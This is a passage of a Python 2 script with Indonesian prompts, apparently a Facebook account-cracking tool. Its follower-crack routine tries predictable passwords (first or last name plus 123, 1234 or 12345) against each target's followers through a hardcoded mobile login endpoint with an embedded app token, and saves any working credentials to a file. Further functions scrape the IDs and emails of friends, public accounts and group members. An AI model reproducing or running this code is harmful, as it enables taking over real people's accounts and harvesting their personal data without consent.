                                                                                                                                                                                                                                                                                                        cekpoint.append(zowe)

		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;35m{\033[1;31m✓\033[1;35m} \033[1;95mSelesai ...'
	print"\033[1;35m{\033[1;31m÷\033[1;35m} \033[1;95mTotal \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
	print '\033[1;35m{\033[1;31m√\033[1;35m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mfile tersimpan \033[1;91m: \033[1;92mdone/likes.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;95mKembali\033[1;97m>}")
	os.system("python2 .Nsaalvd.py")

##### CRACK FOLLOW #####
def crack_follow():
	toket=open('.token.txt','r').read()
	os.system('clear')
	print logo
        print ("         \033[1;95m=>> \033[1;32mNsaaLvd Followers Crack \033[1;95m<===")
        print 50* "\033[1;94m─"
	idt = raw_input("\033[1;95m{\033[1;31m∆\033[1;35m} \033[1;36mID Publik \033[1;31m:\033[1;32m ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;35m{\033[1;31m√\033[1;35m} \033[1;36mNama \033[1;31m:\033[1;32m "+op["name"]
	except KeyError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} ID tidak ada !"
		raw_input("\n\033[1;95m[\033[1;31m{!} Kembali\033[1;95m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
		keluar()
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
	z = json.loads(r.text)
	for i in z['data']:
		id.append(i['id'])
		
	print "\033[1;35m{\033[1;31m÷\033[1;35m} \033[1;36mTotal ID Followers \033[1;31m:\033[1;32m "+str(len(id))
	print('\033[1;35m{\033[1;31m×\033[1;35m} \033[1;36mTekan CTRL + Z Untuk Berhenti')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;35m{\033[1;31m✓\033[1;35m} \033[1;36mSedang Proses Crack... "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;35m{\033[1;31m●\033[1;35m} \033[1;36mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;34m──────────────────────────────────────────────────")
	
##### MAIN FOLLOW #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;32mSUCCESS")
				print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
	                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
				print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos1
				oke = open("done/follow.txt", "a")
				oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;31mCHEKPOINT")
					print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos1
					cek = open("done/follow.txt", "a")
					cek.write("\n{×} CEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;32mSUCCESS")
					        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos2
						oke = open("done/follow.txt", "a")
						oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;31mCHEKPOINT")
					                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos2
							cek = open("done/follow.txt", "a")
							cek.write("\n{×} CEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;32mSUCCESS")
					                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos3
								oke = open("done/follow.txt", "a")
								oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;31mCHECKPOINT")
					                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos3
									cek = open("done/follow.txt", "a")
									cek.write("\n{×} CEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['last_name'].lower()+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;33mSUCCESS")
					                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos4
										oke = open("done/follow.txt", "a")
										oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;31mCHECKPOINT")
					                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos4
											cek = open("done/follow.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;33mSUCCESS")
					                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos5
												oke = open("done/follow.txt", "a")
												oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;31mCHECKPOINT")
					                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos5
													cek = open("done/follow.txt", "a")
													cek.write("\n{×} CEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;33mSUCCESS")
					                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos6
											                	oke = open("done/follow.txt", "a")
														oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;31mCHECKPOINT")
					                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos6
															cek = open("done/follow.txt", "a")
															cek.write("\n{×} CEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;35m{\033[1;31m✓\033[1;97m} \033[1;95mSelesai ...'
	print"\033[1;35m{\033[1;31m÷\033[1;97m} \033[1;95mTotal \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
	print '\033[1;35m{\033[1;31m√\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mfile tersimpan \033[1;91m: \033[1;92mdone/follow.txt'
	print 50* "\033[1;34m─"
	raw_input("\033[1;97m{<\033[1;95mKembali\033[1;97m>}")
	os.system("python2 .Nsaalvd.py")

###### DUMP ID ######

def dump():
	os.system('clear')
	try:
		toket=open(".token.txt","r").read()
	except IOError:
		print"\033[1;91m{!} Token Kadaluarsa {!}"
		os.system('rm -rf .token.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;31m{\033[1;0m01\033[1;31m}\033[1;36m Mengambil ID Dari Daftar Teman"
	print "\033[1;31m{\033[1;0m02\033[1;31m}\033[1;36m Mengambil ID Dari Akun Publik"
	print "\033[1;31m{\033[1;0m03\033[1;31m}\033[1;36m Mengambil ID Random"
	print "\033[1;31m{\033[1;0m04\033[1;31m}\033[1;36m Mengambil ID Dari Member Grup"
	print "\033[1;31m{\033[1;0m05\033[1;31m}\033[1;36m Mengambil Email Dari Member Grup"
	print "\033[1;31m{\033[1;0m06\033[1;31m}\033[1;36m Mengambil Email Dari Daftar Teman"
	print "\033[1;31m{\033[1;0m07\033[1;31m}\033[1;36m Mengambil Email Dari Akun Publik"
	print "\033[1;31m{\033[1;32m00\033[1;31m}\033[1;36m Kembali Ke Menu Awal"
	print "\033[1;34m──────────────────────────────────────────────────\033[0m"
	dump_pilih()
#----pilih
def dump_pilih():
        print"\033[1;31m{!} PERHATIAN {!}\033[0m\nJika ingin menargetkan akun untuk di ambil\ndaftar temannya, cari akun yang daftar temannya\nterpublikasi, bukan private."
	cuih = raw_input("\033[1;31m  ︻デ═\033[0m一▸   \033[1;31m: \033[0m")
	if cuih =="":
		print "\033[1;91m{!} Pilihan salah"
		dump_pilih()
	elif cuih =="1":
		id_teman()
	elif cuih =="2":
		idfrom_teman()
	elif cuih =="3":
		print "\033[1;31mComing soon"
                jalan("\033[1;32mMasih Dalam Proses Pengembangan\nTools terupdate, silahkan hubungi kontak berikut\n\033[1;36mFacebook : Bagaskurniawan Ex\n\033[1;33mWhatsApp : 089614402699")
                time.sleep(6.9)
                menu()
	elif cuih =="4":
		id_member_grup()
	elif cuih =="5":
		print "\033[1;31mComing soon"
                jalan("\033[1;32mMasih Dalam Proses Pengembangan\nTools terupdate, silahkan hubungi kontak berikut\n\033[1;36mFacebook : Bagaskurniawan Ex\n\033[1;33mWhatsApp : 089614402699")
                time.sleep(6.9)
                menu()
	elif cuih =="6":
		print "\033[1;31mComing soon"
                jalan("\033[1;32mMasih Dalam Proses Pengembangan\nTools terupdate, silahkan hubungi kontak berikut\n\033[1;36mFacebook : Bagaskurniawan Ex\n\033[1;33mWhatsApp : 089614402699")
                time.sleep(6.9)
                menu()
	elif cuih =="7":
		print "\033[1;31mComing soon"
                jalan("\033[1;32mMasih Dalam Proses Pengembangan\nTools terupdate, silahkan hubungi kontak berikut\n\033[1;36mFacebook : Bagaskurniawan Ex\n\033[1;33mWhatsApp : 089614402699")
                time.sleep(6.9)
                menu()
	elif cuih =="0":
		menu()
	else:
		print "\033[1;31m{!} Pilihan Salah {!}"
		dump_pilih()

##### ID TEMAN #####
def id_teman():
	os.system('reset')
	try:
		toket=open(".token.txt","r").read()
        except IOError:
                os.system("clear")
                print("~ Token Kadaluarsa ~")
                os.system("rm -rf .token.txt")
                time.sleep(1)
                os.system("python2 .Nsaalvd.py")
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;31m{×} \033[1;36mDump ID Teman \033[1;97m...')
		print "\033[1;34m──────────────────────────────────────────────────\033[0m"
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;32mSukses Dump ID Teman \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mFile akan di simpan dengan nama?\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile tersimpan di \033[1;34mout\033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m{!} Error membuat file {!}"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;31m{!} Berhenti {!}")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;31m{!} Berhenti {!}')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m{} Tidak ada koneksi internet {×}"
		keluar()

##### ID FROM TEMAN #####
def idfrom_teman():
	os.system('reset')
	try:
		toket=open(".token.txt","r").read()
        except IOError:
                os.system("clear")
                print("~ Token Kadaluarsa ~")
                os.system("rm -rf .token.txt")
                time.sleep(1)
                os.system("python2 .Nsaalvd.py")
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;31m{!} \033[1;36mMasukan ID Teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m{!} Teman Tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;31m{✺} \033[1;32mSedang Mengambil ID Teman Anda \033[1;97m...')
		print "\033[1;34m──────────────────────────────────────────────────\033[0m"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSukses Dump ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mFile akan di save dengan nama?\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile tersimpan \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;31m{!} Error membuat file {!}"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;31m{!} Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m{!} Berhenti {!}')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m{×} Koneksi Internet Tidak ada"
		keluar()

##### ID FROM MEMBER GRUP #####
def id_member_grup():
	try:
		toket=open(".token.txt","r").read()
        except IOError:
                os.system("clear")
                print("~ Token Kadaluarsa ~")
                os.system("rm -rf .token.txt")
                time.sleep(1)
                os.system("python2 .Nsaalvd.py")
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;31m{+) \033[1;36mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama Grup \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;31m Grup tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			dump()
		jalan('\033[1;31m{✺} \033[1;36mMemgambil ID Dari Member Grup \033[1;97m...')
		print "\033[1;34m──────────────────────────────────────────────────\033[0m"
		bz = open('out/member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			idmem.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSukses mengambil ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mFilen disave dengan nama?\033[1;91m :\033[1;97m ")
		os.rename('out/member_grup.txt','out/'+done)
		print("\r\033[1;91m{?} \033[1;92mFile tersimpan \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m{!} Error saat membuat file {!}"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m{×} Koneksi error"
		keluar()
		
		dump()
	except KeyError:
		print('\033[1;91m{!}')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m{!} Koneksi Error"
		keluar()
		
##### EMAIL FROM GRUP #####
def em_member_grup():
	try:
		toket=open(".token.txt","r").read()
        except IOError:
                os.system("clear")
                print("~ Token Kadaluarsa ~")
                os.system("rm -rf .token.txt")
                time.sleep(1)
                os.system("python2 .Nsaalvd.py")
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emmem.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### EMAIL #####
def email():
	try:
		toket=open(".token.txt","r").read()
        except IOError:
                os.system("clear")
                print("~ Token Kadaluarsa ~")
                os.system("rm -rf .token.txt")
                time.sleep(1)
                os.system("python2 .Nsaalvd.py")
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/email_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				em.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/email_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### EMAIL FROM TEMAN #####
def emailfrom_teman():
	os.system('reset')
	try:
		toket=open(".token.txt","r").read()
        except IOError:
                os.system("clear")
                print("~ Token Kadaluarsa ~")
                os.system("rm -rf .token.txt")
                time.sleep(1)
                os.system("python2 .Nsaalvd.py")
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromteman.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
